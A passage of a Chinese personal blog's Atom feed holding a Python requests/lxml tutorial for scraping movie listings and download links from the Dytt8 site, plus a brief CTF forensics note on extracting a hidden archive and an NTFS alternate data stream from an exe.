        &lt;h4 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h4&gt;&lt;p&gt;将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。&lt;br&gt;&lt;strong&gt;这个爬虫比较简单没有做反爬处理，所以对于获
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>爬虫实战_电影天堂爬虫</title>
    <link href="https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB.html"/>
    <id>https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB.html</id>
    <published>2020-02-05T05:23:21.000Z</published>
    <updated>2020-02-07T12:12:02.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxml库结合来解析得到的html代码，当然也可以使用BeautifulSoup库来解析，但我比较喜欢lxml库和XPATH语法相结合的解析。</strong></p><hr><p><strong>这个实战是爬取电影天堂热门电影前七页。分为三步：1.获取每个页面的电影详细页；2.解析每个电影详细页；3.将第一步和第二步结合，爬取前七页。</strong></p><hr><p>具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">BASE_DOMAIN&#x3D;&quot;https:&#x2F;&#x2F;www.dytt8.net&quot;</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_url(url):</span><br><span class="line">    resp &#x3D; requests.get(url, headers&#x3D;HEADERS)</span><br><span class="line">    text &#x3D; resp.text</span><br><span class="line">    # print(text)</span><br><span class="line">    html &#x3D; etree.HTML(text)</span><br><span class="line">    detail_urls &#x3D; html.xpath(&quot;&#x2F;&#x2F;ul&#x2F;&#x2F;table[@class&#x3D;&#39;tbspan&#39;]&#x2F;&#x2F;a&#x2F;@href&quot;)</span><br><span class="line">    # def abc(url1):</span><br><span class="line">    #     return BASE_DOMAIN+url1</span><br><span class="line">    # index&#x3D;0</span><br><span class="line">    # for detail_url in detail_urls:</span><br><span class="line">    #         detail_url &#x3D; abc(detail_url)</span><br><span class="line">    #         detail_urls[index]&#x3D;detail_url</span><br><span class="line">    #         index &#x3D;index+1</span><br><span class="line">    detail_urls&#x3D;map(lambda url:BASE_DOMAIN+url,detail_urls)</span><br><span class="line">    return detail_urls</span><br><span class="line">def parse_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.content.decode(&quot;gbk&quot;)</span><br><span class="line">    movie&#x3D;&#123;&#125;</span><br><span class="line">    #print(text)</span><br><span class="line">    html&#x3D;etree.HTML(text)</span><br><span class="line">    #电影名称</span><br><span class="line">    title&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;title_all&#39;]&#x2F;&#x2F;font[@color&#x3D;&#39;#07519a&#39;]&#x2F;&#x2F;text()&quot;)[0]</span><br><span class="line">    movie[&#39;title&#39;]&#x3D;title</span><br><span class="line">    #电影海报</span><br><span class="line">    img&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@id&#x3D;&#39;Zoom&#39;]&#x2F;&#x2F;img&#x2F;@src&quot;)</span><br><span class="line">    cover&#x3D;img</span><br><span class="line">    movie[&#39;cover&#39;]&#x3D;cover</span><br><span class="line">    #div下所有文本</span><br><span class="line">    infos&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@id&#x3D;&#39;Zoom&#39;]&#x2F;&#x2F;text()&quot;)</span><br><span class="line">    for index,info in enumerate(infos):</span><br><span class="line">        def page_info(info,rules):</span><br><span class="line">            info&#x3D;info.replace(rules,&quot;&quot;).strip()</span><br><span class="line">            return info</span><br><span class="line">        if info.startswith(&quot;◎年　　代&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎年　　代&quot;)</span><br><span class="line">            movie[&#39;year&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎产　　地&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎产　　地&quot;)</span><br><span class="line">            movie[&#39;country&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎类　　别&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎类　　别&quot;)</span><br><span class="line">            movie[&#39;类别&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎豆瓣评分&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎豆瓣评分&quot;)</span><br><span class="line">            movie[&#39;豆瓣评分&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎导　　演&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎导　　演&quot;)</span><br><span class="line">            dirctors&#x3D;[info]</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                dirctor&#x3D;infos[x].strip()</span><br><span class="line">                if dirctor.startswith(&quot;◎编　　剧&quot;):</span><br><span class="line">                    break</span><br><span class="line">                dirctors.append(dirctor)</span><br><span class="line">            movie[&#39;导演&#39;]&#x3D;dirctors</span><br><span class="line">        elif info.startswith(&quot;◎编　　剧&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎编　　剧&quot;)</span><br><span class="line">            movie[&quot;编剧&quot;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎主　　演&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎主　　演&quot;)</span><br><span class="line">            actors&#x3D;[info]</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                actor&#x3D;infos[x].strip()</span><br><span class="line">                if(actor.startswith(&quot;◎标　　签&quot;)):</span><br><span class="line">                    break</span><br><span class="line">                actors.append(actor)</span><br><span class="line">            movie[&#39;actors&#39;]&#x3D;actors</span><br><span class="line">        elif info.startswith(&quot;◎简　　介&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎简　　介&quot;)</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                detail&#x3D;infos[x].strip()</span><br><span class="line">                if(detail.startswith(&quot;◎获奖情况&quot;)):</span><br><span class="line">                    break</span><br><span class="line">                movie[&#39;detail&#39;]&#x3D;detail</span><br><span class="line">    download_url&#x3D;html.xpath(&quot;&#x2F;&#x2F;td[@bgcolor&#x3D;&#39;#fdfddf&#39;]&#x2F;&#x2F;a&#x2F;text()&quot;)</span><br><span class="line">    movie[&#39;download_url&#39;]&#x3D;download_url</span><br><span class="line">    return movie</span><br><span class="line">def spider():</span><br><span class="line">    #爬取前7页</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.dytt8.net&#x2F;html&#x2F;gndy&#x2F;dyzz&#x2F;list_23_&#123;&#125;.html&quot;</span><br><span class="line">    movies&#x3D;[]</span><br><span class="line">    for x in range(1,8):</span><br><span class="line">        #第一个循环获取每个页面</span><br><span class="line">        url&#x3D;base_url.format(x)</span><br><span class="line">        detail_urls&#x3D;get_detail_url(url)</span><br><span class="line">        for detail_url in detail_urls:</span><br><span class="line">            #第二个循环获取每个网页电影的详细页</span><br><span class="line">            movie&#x3D;parse_detail_page(detail_url)</span><br><span class="line">            movies.append(movie)</span><br><span class="line">        print(movies)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    spider()</span><br></pre></td></tr></table></figure><hr><h5 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h5><p><strong>获取每个网页的电影详细页：</strong></p><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/1.png" class title="This is an test image"><hr><h5 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h5><p><strong>解析电影详细页：</strong></p><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/2.png" class title="This is an test image"><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/3.png" class title="This is an test image"><hr><h5 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h5><p><strong>爬取前七页：</strong></p><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/4.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxm
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [SWPU2019]我有一只马里奥</title>
    <link href="https://da4er.top/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5.html"/>
    <id>https://da4er.top/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5.html</id>
    <published>2020-02-05T05:13:09.000Z</published>
    <updated>2020-02-07T07:51:48.295Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目是一个exe文件，binwalk查看到有个压缩包。</strong><br><img src="/1.png" alt="2-5-SWPU2019-我有一只马里奥"><br><strong>打开压缩包，发现题目是ntfs数据流隐写，用工具提取。</strong><br><img src="/2.png" alt="2-5-SWPU2019-我有一只马里奥"><br><img src="/3.png" alt="2-5-SWPU2019-我有一只马里奥"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目是一个exe文件，binwalk查看到有个压缩包。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/1.png&quot; alt=&quot;2-5-SWPU2019-我有一只马里奥&quot;&gt;&lt;br&gt;&lt;strong&gt;打开压缩包，发现题目是ntfs数据流隐写，用工具提取。&lt;/str
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
</feed>
